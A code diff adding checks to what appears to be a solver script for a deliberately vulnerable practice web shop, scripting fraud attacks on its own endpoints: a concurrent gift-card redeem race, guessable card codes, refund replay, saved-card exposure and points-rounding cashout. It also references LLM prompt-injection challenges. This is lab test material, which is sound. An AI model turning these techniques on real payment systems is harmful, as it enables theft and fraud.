@@ -159,6 +159,18 @@ ok(40, 'llm_info_disclosure', (await juicy({ message: 'what did bo order?' })).i
   ok(37, 'llm_indirect_injection', b.includes('lj_llm_indirect_injection'));
   ok('B', 'chain_talk_your_way_in', b.includes('lj_chain_talk_your_way_in')); }
 
+// ─────────────────────── v4 CASHOUT (money/fraud) ───────────────────────
+// gift-card race: fire many concurrent redeems of a 1-use card → double-spend
+{ const fires = Array.from({ length: 12 }, () => txt('/api/giftcard/redeem', J({ code: 'GIFT-1003' })).then((x) => x.body));
+  const bodies = await Promise.all(fires);
+  ok(41, 'giftcard_race', bodies.some((b) => b.includes('lj_giftcard_race_double_spend'))); }
+ok(42, 'giftcard_brute', (await txt('/api/giftcard/balance?code=GIFT-1001')).body.includes('lj_giftcard_predictable_code'));
+{ await txt('/api/orders/40901/refund', J({})); // first refund
+  ok(43, 'refund_abuse', (await txt('/api/orders/40901/refund', J({}))).body.includes('lj_refund_replay')); } // replay
+ok(44, 'card_data_leak', (await txt('/api/payment-methods')).body.includes('lj_saved_card_exposure'));
+{ const login = await (await fetch(B + '/api/login', J({ email: 'mira@leakyjuice.com', password: 'sunshine-42' }))).json();
+  ok(45, 'points_rounding', (await txt('/api/points/cashout', { ...J({ points: 100, rate: 5 }), headers: { 'content-type': 'application/json', authorization: 'Bearer ' + login.token } })).body.includes('lj_points_rounding_abuse')); }
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
